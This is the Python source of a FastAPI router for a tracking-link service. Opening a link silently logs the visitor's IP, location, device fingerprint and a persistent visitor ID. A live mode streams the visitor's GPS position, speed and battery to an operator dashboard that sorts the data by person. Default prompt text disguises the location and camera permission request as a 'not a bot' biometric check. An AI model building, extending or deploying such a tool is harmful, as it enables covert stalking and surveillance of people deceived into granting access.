"""追跡ルーター：リンク踏み（一瞬/ライブ）・人物ごとの登録・追跡画面。

v8:
  ・監視室を「識別者コード」ごとに分割。識別者コードに名前を付けられる
  ・位置が取れない端末のために、回線推定の点も残せるようにした
"""
from __future__ import annotations

import os, re, json, random, string, datetime as dt
from urllib.parse import quote

from fastapi import APIRouter, Request, Depends, Form, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse, PlainTextResponse

from . import users, persist, linktrack, tenancy, config as _config
from .tenancy import db

router = APIRouter()

LIVE_IV_MIN, LIVE_IV_MAX = 5, 600
TRACK_KEEP = int(os.getenv("TRACK_KEEP", "20000"))
LIVE_MAX_MIN = int(os.getenv("LIVE_MAX_MIN", "180"))

GATE_EXTRA_DEFAULT = """・位置情報（GPS）を使用します
・カメラで映像、マイクで音声を記録します
・アプリのインストールや会員登録は不要です"""

LIVE_DEFAULTS = {
    "ui": "",
    "ask_text": "ボットでないことを確認するため生体認証を行う必要があります",
    "deny_text": "アクセスを許可されなかったため確認できませんでした。アクセスを許可してください",
    "retry_text": "もう一度",
    "go_text": "確認する",
    "wait_sec": 15.0,
    "dest_min": 2.0,
    "deny_redirect": False,
    "dest_redirect": True,
    "promote_page": True,
    "gate": True,
    "gate_warn": True,
    "gate_extra": GATE_EXTRA_DEFAULT,
    "gate_copy": False,
    "gate_link": False,
    "require_all": True,
}

ENV_MAP = {
    "ui": "LIVE_UI", "ask_text": "LIVE_ASK_TEXT", "deny_text": "LIVE_DENY_TEXT",
    "retry_text": "LIVE_RETRY_TEXT", "go_text": "LIVE_GO_TEXT", "wait_sec": "LIVE_WAIT",
    "dest_min": "LIVE_DEST_MIN", "deny_redirect": "LIVE_DENY_REDIRECT",
    "dest_redirect": "LIVE_DEST_REDIRECT", "promote_page": "PROMOTE_PAGE_TO_LIVE",
    "gate": "LIVE_GATE", "gate_warn": "LIVE_GATE_WARN", "gate_extra": "LIVE_GATE_EXTRA",
    "gate_copy": "LIVE_GATE_COPY", "gate_link": "LIVE_GATE_LINK",
    "require_all": "LIVE_REQUIRE_ALL",
}

UI_CHOICES = ("", "none", "ask")
UI_LABEL = {
    "": "自動（飛び先があれば案内を出す／なければ無言）",
    "none": "無言（文言なし。失敗時だけ「もう一度」ボタン）",
    "ask": "案内の1行だけ出す",
}

VALID_MODES = ("page", "geo", "snap", "live", "quiz", "identify", "redirect")


def _coerce(key, v):
    d = LIVE_DEFAULTS[key]
    if isinstance(d, bool):
        if isinstance(v, bool):
            return v
        return str(v).strip().lower() not in ("0", "false", "off", "no", "")
    if isinstance(d, float):
        try:
            return float(v)
        except (TypeError, ValueError):
            return d
    return str(v)


def live_cfg():
    out = dict(LIVE_DEFAULTS)
    for k, env in ENV_MAP.items():
        v = os.getenv(env)
        if v is None or v == "":
            continue
        out[k] = _coerce(k, v)
    try:
        sec = _config.get().get("live") or {}
    except Exception:
        sec = {}
    if isinstance(sec, dict):
        for k in LIVE_DEFAULTS:
            v = sec.get(k)
            if v is None or v == "":
                continue
            out[k] = _coerce(k, v)
    if out["ui"] not in UI_CHOICES:
        out["ui"] = ""
    out["wait_sec"] = max(3.0, min(float(out["wait_sec"]), 120.0))
    out["dest_min"] = max(0.5, min(float(out["dest_min"]), 30.0))
    return out


def _m():
    from . import main
    return main


def render(name, request, **ctx):
    return _m().render(name, request, **ctx)


async def auth(request: Request):
    return await _m().auth(request)


def _record_hit(request, code):
    return _m()._record_hit(request, code)


def _now():
    return _m().now_iso()


def _bind_owner(code):
    owner = users.owner_of_link(code)
    if not owner:
        return None
    tenancy.set_current(owner)
    try:
        persist.touch(owner, interval=persist.cfg()["every_hit"])
    except Exception:
        pass
    return owner


def _f(v):
    try:
        return float(v)
    except (TypeError, ValueError):
        return None


def _recent(ts, sec):
    if not ts:
        return False
    try:
        t = dt.datetime.fromisoformat(ts)
        if t.tzinfo is None:
            t = t.replace(tzinfo=dt.timezone.utc)
        return (dt.datetime.now(dt.timezone.utc) - t).total_seconds() <= sec
    except Exception:
        return False


def _clamp_iv(v):
    try:
        v = int(v or 15)
    except Exception:
        v = 15
    return max(LIVE_IV_MIN, min(v, LIVE_IV_MAX))


def _new_code(n=8):
    a = string.ascii_lowercase + string.digits
    for _ in range(60):
        c = "".join(random.choice(a) for _ in range(n))
        if not db.link_get(c):
            return c
    return "".join(random.choice(a) for _ in range(n + 4))


def _abs_dest(d):
    d = (d or "").strip()
    if not d:
        return ""
    if not re.match(r"^[a-zA-Z][a-zA-Z0-9+.\-]*:", d):
        d = "https://" + d
    return d


def _get_track(code):
    link = db.track_get(code)
    if link:
        return link
    l = db.link_get(code)
    if l and (l["mode"] or "page") == "page" and live_cfg()["promote_page"]:
        db.track_update(code, mode="live", interval=_clamp_iv(l["interval"]))
        return db.track_get(code)
    return l


# ---------- 識別者コード（vid）ごとの整理 ----------

def _vid_maps(code):
    """hit_id → vid と、既知の vid 集合と、vid のラベル。"""
    vidmap, labels = {}, {}
    try:
        for h in db.q("SELECT id,vid FROM link_hits WHERE code=?", (code,)):
            if h["vid"]:
                vidmap[h["id"]] = h["vid"]
    except Exception:
        pass
    try:
        for v in db.visitors(2000):
            if v["vid"]:
                labels[v["vid"]] = v["label"] or ""
    except Exception:
        pass
    return vidmap, set(labels.keys()), labels


def _person_key(row, vidmap, vids):
    """1点が誰のものかを決める。vid が取れなければ ip 単位にまとめる。"""
    try:
        note = str(row["note"] or "")
        if note.isdigit():
            v = vidmap.get(int(note))
            if v:
                return v
        sid = str(row["sid"] or "")
        if sid and sid in vids:
            return sid
    except Exception:
        pass
    try:
        return "ip:" + (row["ip"] or "-")
    except Exception:
        return "ip:-"


def _tp_row(code, link, ip, p, g, q, kind="pt", sid="", note=""):
    lat = _f(q.get("lat") if q.get("lat") is not None else q.get("gps_lat"))
    lon = _f(q.get("lon") if q.get("lon") is not None else q.get("gps_lon"))
    if lat is not None and not (-90.0 <= lat <= 90.0):
        lat = None
    if lon is not None and not (-180.0 <= lon <= 180.0):
        lon = None
    src = "gps"
    if lat is None and g.get("lat") is not None:
        lat, lon, src = _f(g.get("lat")), _f(g.get("lon")), "ip"
    acc = _f(q.get("acc") if q.get("acc") is not None else q.get("gps_acc"))
    ts = str(q.get("ts") or "")[:32]
    if len(ts) < 19:
        ts = _now()
    chg = q.get("chg")
    rid = None
    try:
        rid = link["rid"] if link and "rid" in link.keys() else None
    except Exception:
        rid = None
    mob = 1 if (g.get("is_mobile") or linktrack.mobile_guess(
        g.get("isp") or "", g.get("org") or "", g.get("asn") or "")) else 0
    return {
        "code": code, "link_id": rid,
        "person": (link["person"] or link["name"]) if link else "",
        "sid": (sid or str(q.get("sid") or ""))[:40], "ts": ts,
        "kind": str(q.get("kind") or kind)[:12], "src": src,
        "lat": lat, "lon": lon, "acc": acc,
        "spd": _f(q.get("spd")), "hdg": _f(q.get("hdg")),
        "ip": ip, "country": g.get("country"), "country_code": g.get("country_code"),
        "region": g.get("region"), "city": g.get("city"),
        "isp": g.get("isp"), "asn": g.get("asn"),
        "device": p.get("device"), "os": p.get("os"), "browser": p.get("browser"),
        "inapp": p.get("inapp"),
        "mobile": mob, "net": (g.get("isp") or "")[:60],
        "battery": _f(q.get("batt")),
        "charging": None if chg is None else (1 if chg else 0),
        "screen": str(q.get("scr") or "")[:40], "note": (note or "")[:40],
    }


def _live_page(request, code, hid, link, nonce):
    L = live_cfg()
    dest = _abs_dest(link["dest"])
    ui = L["ui"] or ("ask" if dest else "none")
    return render("link_live.html", request, code=code, hit_id=hid, link=link,
                  dest=dest, nonce=nonce,
                  iv=_clamp_iv(link["interval"]), maxmin=LIVE_MAX_MIN,
                  ui=ui, ask_text=L["ask_text"], deny_text=L["deny_text"],
                  retry_text=L["retry_text"], go_text=L["go_text"],
                  wait_sec=L["wait_sec"],
                  dest_redirect=(L["dest_redirect"] and bool(dest)),
                  deny_redirect=(L["deny_redirect"] and bool(dest)),
                  dest_min=L["dest_min"],
                  gate=bool(L["gate"]), gate_warn=bool(L["gate_warn"]),
                  gate_extra=L["gate_extra"], gate_copy=bool(L["gate_copy"]),
                  gate_link=bool(L["gate_link"]),
                  require_all=bool(L["require_all"]))


# ================= 公開ルート =================

@router.get("/l/{code}")
def link_hit(code: str, request: Request):
    if not _bind_owner(code):
        return PlainTextResponse("リンクが無効です", status_code=404)
    link = db.link_get(code)
    if not link or not link["active"]:
        return PlainTextResponse("リンクが無効です", status_code=404)
    L = live_cfg()
    hid = _record_hit(request, code)

    try:
        from . import notify
        notify.hit_async(code, hid, request, link)
    except Exception:
        pass

    hrow = db.q1("SELECT nonce FROM link_hits WHERE id=?", (hid,))
    nonce = (hrow["nonce"] if hrow else "") or ""
    mode = (link["mode"] or "page")

    if mode == "redirect" and link["dest"]:
        return RedirectResponse(link["dest"], 302)

    if mode == "quiz" and db.questions(code):
        qs = [{"id": r["id"], "qtype": r["qtype"], "prompt": r["prompt"],
               "options": json.loads(r["options"] or "[]")} for r in db.questions(code)]
        return render("link_quiz.html", request, code=code, hit_id=hid, link=link,
                      dest=link["dest"] or "", nonce=nonce,
                      retry_text=L["retry_text"],
                      questions_json=json.dumps(qs, ensure_ascii=False))

    if mode == "identify":
        ip = linktrack.client_ip(request)
        return render("link_identify.html", request, code=code, hit_id=hid, link=link,
                      dest=link["dest"] or "", nonce=nonce, ip=ip,
                      retry_text=L["retry_text"],
                      p=linktrack.parse_ua(request.headers.get("user-agent", "")),
                      g=linktrack.geo(ip))

    if mode == "live" or (mode == "page" and L["promote_page"]):
        if mode != "live":
            db.track_update(code, mode="live", interval=_clamp_iv(link["interval"]))
            link = db.link_get(code) or link
        return _live_page(request, code, hid, link, nonce)

    return render("link_land.html", request, code=code, hit_id=hid, link=link,
                  dest=link["dest"] or "", nonce=nonce,
                  ask_text=L["ask_text"], go_text=L["go_text"],
                  deny_text=L["deny_text"], retry_text=L["retry_text"],
                  deny_redirect=L["deny_redirect"], dest_min=L["dest_min"])


@router.post("/l/{code}/x")
async def link_extra(code: str, request: Request):
    if not _bind_owner(code):
        return {"ok": False}
    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}
    hid = body.get("hit_id")
    if not hid:
        return {"ok": False}

    ip = linktrack.client_ip(request)
    ua = request.headers.get("user-agent", "")
    p = linktrack.parse_ua(ua)
    g = linktrack.geo(ip)

    f = {}
    for k in ("screen", "tz", "platform", "cores", "mem", "touch"):
        if body.get(k) not in (None, ""):
            f[k] = body[k]
    if body.get("gps_lat") is not None:
        f["gps_lat"] = body.get("gps_lat")
        f["gps_lon"] = body.get("gps_lon")
        f["gps_acc"] = body.get("gps_acc")
    if body.get("fp"):
        f["fingerprint"] = str(body["fp"])[:128]
    if body.get("fp_json"):
        f["fp_json"] = json.dumps(body["fp_json"], ensure_ascii=False)[:8000]
    if body.get("vid"):
        f["vid"] = str(body["vid"])[:64]
    if body.get("pubkey"):
        f["pubkey"] = str(body["pubkey"])[:512]
    if body.get("sig"):
        f["sig"] = str(body["sig"])[:512]
    if f:
        db.update_hit(int(hid), **f)

    row = db.q1("SELECT nonce,vid,pubkey,sig FROM link_hits WHERE id=?", (int(hid),))
    if row and row["nonce"] and row["pubkey"] and row["sig"]:
        db.update_hit(int(hid), sig_ok=1 if linktrack.verify_sig(
            row["pubkey"], row["sig"], row["nonce"]) else 0)

    vid = (row["vid"] if row else "") or ""
    if vid:
        db.upsert_visitor(
            vid, ip=ip, country=g.get("country"), region=g.get("region"),
            city=g.get("city"), isp=g.get("isp"), asn=g.get("asn"),
            device=p["device"], os=p["os"], browser=p["browser"], inapp=p["inapp"],
            fingerprint=str(body.get("fp") or "")[:128],
            pubkey=str(body.get("pubkey") or "")[:512])

    link = db.track_get(code)
    # GPSが取れなかった端末でも点を残す（ip_point=1 で回線推定）
    if link and link["active"] and (body.get("gps_lat") is not None
                                    or body.get("ip_point")):
        trow = _tp_row(code, link, ip, p, g, body, kind="snap", sid=vid)
        if trow["lat"] is not None:
            db.add_points(code, [trow])
            db.track_update(code, last_ts=trow["ts"], last_lat=trow["lat"],
                            last_lon=trow["lon"], last_acc=trow["acc"],
                            last_city=trow["city"], last_ip=trow["ip"],
                            last_src=trow["src"], points=int(link["points"] or 0) + 1)
    return {"ok": True, "vid": vid}


@router.post("/l/{code}/p")
async def link_point(code: str, request: Request):
    if not _bind_owner(code):
        return {"ok": 0, "why": "noowner"}
    link = _get_track(code)
    if not link or not link["active"]:
        return {"ok": 0, "why": "invalid"}

    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}

    ip = linktrack.client_ip(request)
    p = linktrack.parse_ua(request.headers.get("user-agent", ""))
    g = linktrack.geo(ip)

    sid = str(body.get("sid") or "")[:40]
    hid = str(body.get("hit") or "")[:20]
    kind = str(body.get("kind") or "pt")[:12]
    if kind not in ("pt", "open", "hb", "stop"):
        kind = "pt"

    raw = body.get("pts")
    raw = raw if isinstance(raw, list) else []
    if body.get("lat") is not None:
        raw = [body] + raw
    raw = raw[:200]

    prev = db.last_point(code)
    pkey = (round(prev["lat"], 5), round(prev["lon"], 5)) \
        if prev and prev["lat"] is not None else None
    pts_ts = prev["ts"] if prev else ""

    rows, last = [], None
    for q in raw:
        if not isinstance(q, dict):
            continue
        row = _tp_row(code, link, ip, p, g, q, kind="pt", sid=sid, note=hid)
        if row["lat"] is None:
            continue
        key = (round(row["lat"], 5), round(row["lon"], 5))
        if key == pkey and row["ts"][:19] == (pts_ts or "")[:19]:
            continue
        pkey, pts_ts = key, row["ts"]
        rows.append(row)
        last = row

    n = db.add_points(code, rows)
    fields = {"live": 0 if kind == "stop" else 1, "session_id": sid}
    if last:
        fields.update(last_ts=last["ts"], last_lat=last["lat"], last_lon=last["lon"],
                      last_acc=last["acc"], last_city=last["city"], last_ip=last["ip"],
                      last_src=last["src"], last_batt=last["battery"],
                      last_charging=last["charging"])
    if n:
        fields["points"] = int(link["points"] or 0) + n
    db.track_update(code, **fields)
    if n and (int(link["points"] or 0) % 500) < n:
        db.prune_points(code, keep=TRACK_KEEP)

    return {"ok": 1, "n": n, "iv": _clamp_iv(link["interval"]), "server": _now()}


@router.get("/api/track/{code}")
def api_track(code: str, request: Request, since: int = 0, limit: int = 1500):
    if not _bind_owner(code):
        raise HTTPException(404, "noowner")
    link = _get_track(code)
    if not link:
        raise HTTPException(404, "notrack")
    try:
        since = int(since)
    except Exception:
        since = 0
    try:
        limit = min(max(int(limit), 1), 5000)
    except Exception:
        limit = 1500
    rows = db.points(code, since=since, limit=limit)
    vidmap, vids, labels = _vid_maps(code)
    iv = _clamp_iv(link["interval"])

    def _g(r, k, d=None):
        try:
            return r[k]
        except (IndexError, KeyError):
            return d

    ip_only = sum(1 for r in rows if (_g(r, "src") or "") == "ip")
    mob = sum(1 for r in rows if _g(r, "mobile"))
    warn = ""
    if ip_only:
        warn = linktrack.IP_WARN + (f"（モバイル回線の点: {mob}件）" if mob else "")

    return {
        "person": link["person"] or link["name"], "name": link["name"],
        "dest": link["dest"] or "", "mode": link["mode"],
        "active": bool(link["active"]), "interval": iv,
        "live": bool(link["live"]) and _recent(link["last_ts"], max(90, iv * 4)),
        "last": {"ts": link["last_ts"], "lat": link["last_lat"], "lon": link["last_lon"],
                 "acc": link["last_acc"], "city": link["last_city"],
                 "ip": link["last_ip"], "src": link["last_src"],
                 "batt": link["last_batt"], "chg": link["last_charging"]},
        "count": db.point_count(code),
        "ip_only": ip_only, "mobile_points": mob, "warn": warn,
        "sessions": [{"sid": s["sid"], "first": s["first"], "last": s["last"], "n": s["n"]}
                     for s in db.track_sessions(code)],
        "points": [{"id": r["id"], "ts": r["ts"], "lat": r["lat"], "lon": r["lon"],
                    "acc": r["acc"], "src": r["src"], "city": r["city"], "ip": r["ip"],
                    "batt": r["battery"], "chg": r["charging"], "spd": r["spd"],
                    "key": _person_key(r, vidmap, vids)} for r in rows],
        "server": _now(),
    }


# ================= 設定画面 =================

@router.get("/livetrack", response_class=HTMLResponse)
def live_settings_page(request: Request, msg: str = "", err: str = "", u=Depends(auth)):
    L = live_cfg()
    saved = {}
    try:
        saved = _config.get().get("live") or {}
    except Exception:
        saved = {}
    env_over = {k: os.getenv(e) for k, e in ENV_MAP.items() if os.getenv(e)}
    return render("live_settings.html", request, L=L, saved=saved, env_over=env_over,
                  ui_choices=UI_CHOICES, ui_label=UI_LABEL,
                  base=_m()._base(request), msg=msg, err=err)


@router.post("/livetrack")
async def live_settings_save(request: Request, u=Depends(auth)):
    form = await request.form()

    def s(k, d=""):
        return str(form.get(k) if form.get(k) is not None else d).strip()

    def num(k, d):
        try:
            return float(s(k, str(d)) or d)
        except Exception:
            return float(d)

    def flag(k):
        return form.get(k) not in (None, "", "0", "off", "false")

    data = {
        "ui": s("ui"),
        "ask_text": s("ask_text")[:160],
        "deny_text": s("deny_text")[:240],
        "retry_text": s("retry_text")[:40],
        "go_text": s("go_text")[:40],
        "wait_sec": max(3.0, min(num("wait_sec", 15), 120.0)),
        "dest_min": max(0.5, min(num("dest_min", 2), 30.0)),
        "deny_redirect": flag("deny_redirect"),
        "dest_redirect": flag("dest_redirect"),
        "promote_page": flag("promote_page"),
        "gate": flag("gate"),
        "gate_warn": flag("gate_warn"),
        "gate_extra": s("gate_extra")[:800],
        "gate_copy": flag("gate_copy"),
        "gate_link": flag("gate_link"),
        "require_all": flag("require_all"),
    }
    if data["ui"] not in UI_CHOICES:
        data["ui"] = ""
    if not data["gate_extra"]:
        data["gate_extra"] = GATE_EXTRA_DEFAULT
    _config.save_sections({"live": data})
    try:
        persist.push_user(u, force=True)
    except Exception:
        pass
    return RedirectResponse("/livetrack?msg=" + quote("保存しました"), 303)


@router.post("/livetrack/reset")
def live_settings_reset(u=Depends(auth)):
    _config.save_sections({"live": dict(LIVE_DEFAULTS)})
    try:
        persist.push_user(u, force=True)
    except Exception:
        pass
    return RedirectResponse("/livetrack?msg=" + quote("既定に戻しました"), 303)


# ================= 追跡の管理画面 =================

@router.get("/tracks", response_class=HTMLResponse)
def tracks_page(request: Request, u=Depends(auth)):
    rows = []
    for r in db.tracks(500):
        d = dict(r)
        d["pts"] = db.point_count(d["code"])
        d["live"] = bool(d["live"]) and _recent(d["last_ts"], 90)
        rows.append(d)
    groups = {}
    for r in rows:
        groups.setdefault(r.get("person") or r["name"] or "名無し", []).append(r)
    return render("tracks.html", request, rows=rows, groups=groups,
                  base=_m()._base(request), L=live_cfg())


@router.post("/tracks/add")
def tracks_add(request: Request, person: str = Form(""), mode: str = Form("snap"),
               interval: int = Form(15), dest: str = Form(""), note: str = Form(""),
               u=Depends(auth)):
    person = (person or "").strip()[:40] or "名無し"
    mode = mode if mode in VALID_MODES else "page"
    code = _new_code()
    db.add_track(code, person, mode=mode, interval=_clamp_iv(interval),
                 dest=(dest or "").strip(), note=(note or "").strip()[:200])
    try:
        users.register_link(code, u)
    except Exception:
        pass
    return RedirectResponse(f"/track/{code}", status_code=303)


def _people(code, rows):
    vidmap, vids, labels = _vid_maps(code)
    out = {}
    for r in rows:
        key = _person_key(r, vidmap, vids)
        g = out.get(key)
        if not g:
            g = out[key] = {"key": key, "vid": ("" if key.startswith("ip:") else key),
                            "label": labels.get(key, ""), "n": 0, "pts": [],
                            "last": None, "sids": []}
        g["n"] += 1
        g["pts"].append(r)
        g["last"] = r
        s = str(r["sid"] or "")
        if s and s not in g["sids"]:
            g["sids"].append(s)
    return sorted(out.values(), key=lambda g: (g["last"]["ts"] or ""), reverse=True)


def _person_view(g):
    return {
        "key": g["key"], "vid": g["vid"], "label": g["label"], "n": g["n"],
        "sids": g["sids"], "code8": (g["vid"] or g["key"])[:8],
        "last": dict(g["last"]),
    }


@router.get("/track/{code}", response_class=HTMLResponse)
def track_view(code: str, request: Request, v: str = "", u=Depends(auth)):
    link = db.track_get(code)
    if not link:
        raise HTTPException(404)
    rows = [dict(r) for r in db.points(code, limit=5000)]
    people = _people(code, rows)
    cur = next((g for g in people if g["key"] == v), None) if v else None

    return render("track_view.html", request, link=link,
                  people=[_person_view(g) for g in people],
                  cur=(_person_view(cur) if cur else None),
                  cur_json=json.dumps(cur["pts"], ensure_ascii=False) if cur else "[]",
                  all_json=json.dumps(
                      [{"lat": r["lat"], "lon": r["lon"], "src": r["src"]}
                       for r in rows if r["lat"] is not None], ensure_ascii=False),
                  live=bool(link["live"]) and _recent(link["last_ts"], 90),
                  base=_m()._base(request), n=len(rows))


@router.post("/track/{code}/person/name")
def track_person_name(request: Request, code: str, vid: str = Form(""),
                      name: str = Form(""), back: str = Form(""), u=Depends(auth)):
    if vid:
        try:
            db.set_visitor_label(vid, (name or "").strip()[:40], "")
        except Exception:
            pass
    if back:
        return RedirectResponse(f"/track/{code}?v={quote(back)}", status_code=303)
    return RedirectResponse(f"/track/{code}", status_code=303)


@router.post("/track/{code}/update")
def track_update_route(request: Request, code: str, person: str = Form(""),
                       mode: str = Form(""), interval: int = Form(0),
                       note: str = Form(""), active: str = Form(""),
                       u=Depends(auth)):
    link = db.track_get(code)
    if not link:
        raise HTTPException(404)
    f = {}
    if person.strip():
        f["name"] = f["person"] = person.strip()[:40]
    if mode in VALID_MODES:
        f["mode"] = mode
    if interval:
        f["interval"] = _clamp_iv(interval)
    f["note"] = (note or "").strip()[:200]
    if active in ("0", "1"):
        f["active"] = int(active)
    db.track_update(code, **f)
    return RedirectResponse(f"/track/{code}", status_code=303)


@router.post("/track/{code}/clear")
def track_clear(request: Request, code: str, u=Depends(auth)):
    db.clear_points(code)
    return RedirectResponse(f"/track/{code}", status_code=303)


@router.post("/track/{code}/delete")
def track_delete(request: Request, code: str, u=Depends(auth)):
    db.del_track(code)
    try:
        users.unlink_owner(code)
    except Exception:
        pass
    return RedirectResponse("/tracks", status_code=303)